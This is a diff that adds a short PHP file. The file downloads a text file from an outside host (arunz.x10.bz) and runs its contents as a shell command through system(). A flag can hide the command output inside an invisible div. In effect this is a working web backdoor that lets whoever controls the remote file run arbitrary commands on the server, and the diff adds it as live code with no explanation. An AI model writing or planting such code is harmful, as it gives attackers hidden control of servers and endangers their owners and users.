@@ -1,0 +1,21 @@
+<?php
+
+$cont = @file_get_contents("http://arunz.x10.bz/upload/files/cmd.txt");
+
+if($cont) {
+
+	if($disp != 0) echo '<pre>';
+	
+	if($disp != 0) echo '<b>Command : </b><i>'.$cont.'</i> <br><br>';
+
+	if($disp == 0) echo '<div style="display:none;">';
+	system($cont);
+	if($disp == 0) echo '</div>';
+
+	if($disp != 0) echo '</pre>';
+
+} else {
+	if($disp != 0) echo "Not OK";
+}
+
+?>
